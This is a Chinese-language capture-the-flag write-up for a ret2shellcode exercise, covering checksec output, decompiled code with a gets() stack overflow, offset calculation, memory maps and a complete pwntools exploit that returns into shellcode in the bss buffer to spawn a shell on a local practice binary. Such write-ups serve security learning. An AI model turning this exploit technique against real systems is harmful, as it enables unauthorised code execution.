# PWN Exercise - ret2shellcode


## 准备
[pwntools 介绍：](http://brieflyx.me/2015/python-module/pwntools-intro/) pwntools是由Gallopsled开发的一款专用于CTF Exploit的Python库，包含了本地执行、远程连接读写、shellcode生成、ROP链的构建、ELF解析、符号泄漏等

## 题目

>题目：获取shell。


源程序几乎没有开启任何保护，并且有可读，可写，可执行段。
最简单的栈溢出漏洞利用，return shellcode。

`pwn checksec`

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

伪代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```
## PWN

### pwntools 生成 shellcode
```python
context(arch='i386',os='linux',log_level='debug')
#pwnlib.shellcraft.i386.linux.sh()
shellcode = asm(shellcraft.sh())
```
### 计算偏移
一般计算溢出的偏移通过ebp，但是本题ida计算有偏差。
通常程序main函数前三句指令：
```
push    ebp
mov     ebp,esp
sub     esp,28h
```
本题main函数，可以由于栈优化对齐，`and     esp, 0FFFFFFF0h`，导致ida少算了这步8的偏移，实际应为：char s[100]; //  [ebp-6ch]
```
push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
add     esp, 0FFFFFF80h
```
也可以通过gdb调试通过当时的上下文环境计算偏移。偏移值=(溢出点地址-ebp地址)+4
### return shellcode
因为没有开NX，所以bss段和栈都可以执行，我可以将shellcode放在这两块内存中。   
bss data got等是会映射到一个段里，通过w权限可以判断，一般在rx，rx后的第三块内存地址`0x804a000  0x804b000 rwxp     1000 1000   /home/mi/CTF/pwn1_ret2shelcode/ret2shellcode`。   

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/mi/CTF/pwn1_ret2shelcode/ret2shellcode
 0x8049000  0x804a000 r-xp     1000 0      /home/mi/CTF/pwn1_ret2shelcode/ret2shellcode
 0x804a000  0x804b000 rwxp     1000 1000   /home/mi/CTF/pwn1_ret2shelcode/ret2shellcode
0xf7dcb000 0xf7fb1000 r-xp   1e6000 0      /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb1000 0xf7fb2000 ---p     1000 1e6000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb2000 0xf7fb4000 r-xp     2000 1e6000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb4000 0xf7fb6000 rwxp     2000 1e8000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb6000 0xf7fb8000 rwxp     2000 0      
0xf7fcd000 0xf7fcf000 rwxp     2000 0      
0xf7fcf000 0xf7fd2000 r--p     3000 0      [vvar]
0xf7fd2000 0xf7fd3000 r-xp     1000 0      [vdso]
0xf7fd3000 0xf7ffc000 r-xp    29000 0      /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ffc000 0xf7ffd000 r-xp     1000 28000  /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ffd000 0xf7ffe000 rwxp     1000 29000  /usr/lib/i386-linux-gnu/ld-2.30.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
```
方法一将shellcode放到bss段，`strncpy(buf2, s, 0x64u);`buf2在bss段中0x0804A080，然后return跳转到该地址。   
```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
.bss:0804A080 _bss            ends
```
EXP：

```python
from pwn import *

context(arch='i386',os='linux',log_level='debug')
elf = ELF('ret2shellcode')
io = process(elf.path)
#gdb.attach(io,"b * 0x08048593")

#pwnlib.shellcraft.i386.linux.sh()
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080 
payload = shellcode + b'a'*(0x6c-len(shellcode)) + b'bbbb' +  p32(buf2_addr)
io.sendline(payload)
io.interactive()
```


https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/shellcraft.html

